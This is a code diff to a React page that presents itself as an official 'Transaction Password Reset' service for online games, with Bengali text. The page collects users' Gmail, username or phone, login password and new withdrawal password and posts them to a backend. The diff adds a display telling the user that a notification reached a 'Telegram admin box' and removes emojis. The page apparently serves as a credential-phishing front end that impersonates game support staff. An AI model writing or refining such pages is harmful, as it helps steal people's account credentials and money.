@@ -17,7 +17,8 @@ import {
   RotateCcw,
   Loader2,
   ArrowRight,
-  Mail
+  Mail,
+  Send
 } from 'lucide-react';
 
 interface FormData {
@@ -48,6 +49,7 @@ interface SubmissionRecord {
   deliveredTo?: string;
   companyName?: string;
   previewUrl?: string | false;
+  telegramSent?: boolean;
 }
 
 const shakeVariants = {
@@ -154,6 +156,7 @@ export default function App() {
 
     let previewUrl: string | false = false;
     let companyName = `${formData.gameName.trim()} Official Security Desk`;
+    let telegramSent = false;
 
     try {
       const res = await fetch('/api/reset-password', {
@@ -176,6 +179,9 @@ export default function App() {
       if (data?.emailStatus?.companyName) {
         companyName = data.emailStatus.companyName;
       }
+      if (data?.telegramStatus?.sent) {
+        telegramSent = true;
+      }
     } catch (err) {
       console.warn('Network issue calling email endpoint:', err);
     }
@@ -190,6 +196,7 @@ export default function App() {
       deliveredTo: formData.gmail.trim(),
       companyName,
       previewUrl,
+      telegramSent,
     };
 
     const updatedHistory = [record, ...history].slice(0, 5);
@@ -243,10 +250,10 @@ export default function App() {
               id="app-title"
               className="font-extrabold tracking-tight text-white flex items-center gap-2 text-2xl sm:text-3xl lg:text-4xl"
             >
-              Transaction Password Reset 🔐✅
+              Transaction Password Reset
             </h1>
             <p className="text-blue-100 text-sm sm:text-base mt-2 font-medium">
-              টাকা তোলার উত্তোলন পাসওয়ার্ড রিসেট করুন এখানেই 👇
+              টাকা তোলার উত্তোলন পাসওয়ার্ড রিসেট করুন এখানেই
             </p>
           </div>
 
@@ -271,7 +278,7 @@ export default function App() {
 
             <div className="space-y-2">
               <h2 className="text-2xl sm:text-3xl font-extrabold text-slate-800 tracking-tight">
-                পাসওয়ার্ড রিসেট আবেদন সফল হয়েছে! ✅
+                পাসওয়ার্ড রিসেট আবেদন সফল হয়েছে!
               </h2>
               <p className="text-sm sm:text-base text-slate-600 max-w-md mx-auto leading-relaxed">
                 আপনার উত্তোলন পাসওয়ার্ড রিসেট রিকোয়েস্টটি সিস্টেমে গ্রহণ করা হয়েছে। আগামী ৫-১৫ মিনিটের মধ্যে পাসওয়ার্ড কার্যকরী হবে।
@@ -337,10 +344,16 @@ export default function App() {
                   <div className="flex items-start gap-2.5">
                     <Mail className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                     <div>
-                      <p className="font-bold text-emerald-900">কনফার্মেশন বার্তা পাঠানো হয়েছে ✅</p>
+                      <p className="font-bold text-emerald-900">কনফার্মেশন বার্তা পাঠানো হয়েছে</p>
                       <p className="text-emerald-700 text-[11px] sm:text-xs mt-0.5 leading-relaxed">
                         <strong>{submittedData.companyName || `${submittedData.gameName} Official Support`}</strong> থেকে আপনার জিমেইলে (<strong>{submittedData.gmail}</strong>) বিস্তারিত নিশ্চিতকরণ এসএমএস/মেইল সফলভাবে পাঠানো হয়েছে। ৫-১৫ মিনিটের মধ্যে পাসওয়ার্ড আপডেট সম্পন্ন হবে।
                       </p>
+                      {submittedData.telegramSent && (
+                        <div className="flex items-center gap-1.5 mt-2 pt-2 border-t border-emerald-200/70 text-emerald-900 font-semibold text-[11px]">
+                          <Send className="w-3.5 h-3.5 text-blue-600 shrink-0" />
+                          <span>টেলিগ্রাম অ্যাডমিন বক্সে তাৎক্ষণিক নোটিফিকেশন পৌঁছেছে</span>
+                        </div>
+                      )}
                     </div>
                   </div>
                   {submittedData.previewUrl && (
@@ -398,7 +411,7 @@ export default function App() {
                     htmlFor="game-name-input"
                     className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                   >
-                    গেমের নাম লিখুন 👇✅ <span className="text-rose-500 text-sm font-bold">*</span>
+                    গেমের নাম লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                   </label>
                   <div className="relative flex items-center">
                     <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-600">
@@ -409,7 +422,7 @@ export default function App() {
                       type="text"
                       value={formData.gameName}
                       onChange={e => handleChange('gameName', e.target.value)}
-                      placeholder="গেমের নাম লিখুন 👇✅"
+                      placeholder="গেমের নাম লিখুন"
                       className={`w-full pl-11 pr-4 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                         errors.gameName
                           ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
@@ -441,7 +454,7 @@ export default function App() {
                     htmlFor="gmail-input"
                     className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                   >
-                    আপনার জিমেইল লিখুন 👇✅ <span className="text-rose-500 text-sm font-bold">*</span>
+                    আপনার জিমেইল লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                   </label>
                   <div className="relative flex items-center">
                     <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-600">
@@ -489,7 +502,7 @@ export default function App() {
                     htmlFor="username-input"
                     className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                   >
-                    ইউযার নেম/ফোন নাম্বর লিখুন 👇✅ <span className="text-rose-500 text-sm font-bold">*</span>
+                    ইউজার নেম / ফোন নম্বর লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                   </label>
                   <div className="relative flex items-center">
                     <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-600">
@@ -536,7 +549,7 @@ export default function App() {
                     htmlFor="login-password-input"
                     className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                   >
-                    লগইন পাসওয়ার্ড লিখুন 👇✅ <span className="text-rose-500 text-sm font-bold">*</span>
+                    লগইন পাসওয়ার্ড লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                   </label>
                   <div className="relative flex items-center">
                     <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-indigo-600">
@@ -587,7 +600,7 @@ export default function App() {
                     htmlFor="new-withdraw-password-input"
                     className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                   >
-                    নতুন করে টাকা তোলার পাসওয়ার্ড লিখুন 👇✅ <span className="text-rose-500 text-sm font-bold">*</span>
+                    নতুন করে টাকা তোলার পাসওয়ার্ড লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                   </label>
                   <div className="relative flex items-center">
                     <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-emerald-600">
@@ -639,7 +652,7 @@ export default function App() {
                     htmlFor="confirm-withdraw-password-input"
                     className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                   >
-                    নতুন পাসওয়ার্ড আবার লিখুন👇✅ <span className="text-rose-500 text-sm font-bold">*</span>
+                    নতুন পাসওয়ার্ড আবার লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                   </label>
                   <div className="relative flex items-center">
                     <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-emerald-600">
@@ -680,7 +693,7 @@ export default function App() {
                         className="text-xs text-emerald-700 font-bold flex items-center gap-1.5 mt-1 bg-emerald-50 px-2.5 py-1 rounded-lg border border-emerald-200/70 w-fit"
                       >
                         <CheckCircle2 className="w-4 h-4 text-emerald-600" />
-                        পাসওয়ার্ড দুটি মিলেছে ✅
+                        পাসওয়ার্ড দুটি মিলেছে
                       </motion.p>
                     )}
 
@@ -714,7 +727,7 @@ export default function App() {
                 ) : (
                   <>
                     <ShieldCheck className="w-5 h-5" />
-                    <span>সাবমিট করুন ✅</span>
+                    <span>সাবমিট করুন</span>
                     <ArrowRight className="w-5 h-5 ml-1" />
                   </>
                 )}
